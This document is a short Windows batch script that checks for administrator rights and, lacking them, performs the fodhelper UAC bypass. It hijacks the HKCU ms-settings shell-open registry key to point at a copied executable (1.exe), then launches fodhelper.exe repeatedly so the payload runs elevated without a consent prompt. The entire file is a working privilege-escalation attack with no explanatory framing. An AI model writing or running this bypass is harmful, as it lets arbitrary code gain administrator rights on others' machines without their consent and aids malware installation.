@echo off
openfiles >NUL 2>&1 
if NOT %ERRORLEVEL% EQU 0 goto NotAdmin 
echo Hello, this command prompt is an elevated command prompt (Run as administrator).
goto code

:NotAdmin 
echo Not Admin
goto uac

:uac
set "filepath=%userprofile%\Documents\1"
set "filepath12=%userprofile%\Documents\1\1.exe"
if not exist "%filepath%" (
    mkdir "%filepath%"
)
powershell -Command "New-Item 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Force"
powershell -Command "New-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Name 'DelegateExecute' -Value '' -Force"
powershell -Command "if (Test-Path 'HKCU:\Software\Classes\ms-settings\Shell\Open\command') { Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Name '(default)' -Value '%filepath12%' } else { Write-Host 'Registry path does not exist.' }"
xcopy "%userprofile%\Desktop\ghgh\1.exe" "%filepath%"
powershell -command "Start-Process 'fodhelper.exe'"
powershell -command "Start-Process 'fodhelper.exe'"
powershell -command "Start-Process 'fodhelper.exe'"
powershell -command "Start-Process 'fodhelper.exe'"
powershell -command "Start-Process 'fodhelper.exe'"
powershell -command "Start-Process 'fodhelper.exe'"
powershell -command "Start-Process 'fodhelper.exe'"
powershell -command "Start-Process 'fodhelper.exe'"
powershell -command "Start-Process 'fodhelper.exe'"
powershell -command "Start-Process 'fodhelper.exe'"
powershell -command "Start-Process 'fodhelper.exe'"
powershell -command "Start-Process 'fodhelper.exe'"
powershell -command "Start-Process 'fodhelper.exe'"
powershell -command "Start-Process 'fodhelper.exe'"
powershell -command "Start-Process 'fodhelper.exe'"
powershell -command "Start-Process 'fodhelper.exe'"
exit

